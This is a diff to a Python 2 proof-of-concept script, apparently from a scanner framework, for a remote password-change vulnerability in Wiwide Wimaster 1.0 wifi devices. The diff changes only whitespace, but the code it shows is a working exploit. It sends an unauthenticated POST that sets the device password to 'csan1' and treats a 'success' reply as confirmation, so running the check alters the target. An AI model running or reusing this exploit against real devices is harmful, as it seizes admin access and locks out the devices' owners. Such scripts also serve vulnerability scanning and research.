@@ -5,6 +5,7 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 import urllib2
 
+
 class Vuln(ABVuln):
     vuln_id = 'Wiwide_0001'  # 平台漏洞编号，留空
     name = '迈外迪wifi Wimaster 1.0 远程密码修改漏洞'  # 漏洞名称
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '迈外迪wifi'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'fb3fa839-c5da-446c-afad-10f112fc5643'
@@ -35,18 +37,19 @@ class Poc(ABPoc):
 
             payload = '/goform/setPassword'
             pocdata = 'password=csan1'
-        
-            request = urllib2.Request(self.target + payload, data=pocdata) 
+
+            request = urllib2.Request(self.target + payload, data=pocdata)
             response = urllib2.urlopen(request).read()
             if 'success' in response:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
